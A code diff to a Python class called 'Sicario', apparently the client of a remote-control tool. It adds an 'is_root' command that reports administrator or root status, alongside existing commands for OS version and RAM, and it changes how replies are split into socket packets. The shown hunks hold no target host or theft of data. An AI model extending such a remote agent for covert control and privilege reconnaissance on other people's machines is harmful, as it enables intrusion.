@@ -1,6 +1,6 @@
 from __future__ import division
 from psutil import virtual_memory
-import socket, subprocess, os, math, platform
+import socket, subprocess, os, math, platform, ctypes
 
 class Sicario:
 	daemon = False
@@ -79,7 +79,13 @@ class Sicario:
 			elif command[1] == 'system_ver':
 				self.__send(platform.version())
 			elif command[1] == 'ram':
-				self.__send(str(virtual_memory().total/1024/1024))
+				self.__send(virtual_memory().total/1024/1024)
+			elif command[1] == 'is_root':
+				try:
+ 					is_root = os.getuid() == 0
+				except AttributeError:
+ 					is_root = ctypes.windll.shell32.IsUserAnAdmin() != 0
+ 				self.__send(int(is_root == True))
 
 
 
@@ -90,9 +96,9 @@ class Sicario:
 		if len(data) > 2042:
 			packet_count = int(math.ceil(len(data)/2042))
 			for x in range(packet_count):
-				self.socket.send('SC{}({})'.format(str(packet_count-x).zfill(2), data[x*2042:(x+1)*2042]))
+				self.socket.send('SC{}({})'.format(str(packet_count-x).zfill(2), str(data[x*2042:(x+1)*2042])))
 		else: 
-			packet = 'SC00({})'.format(data)
+			packet = 'SC00({})'.format(str(data))
 			self.socket.send(packet)
 
 	def __receive (self):
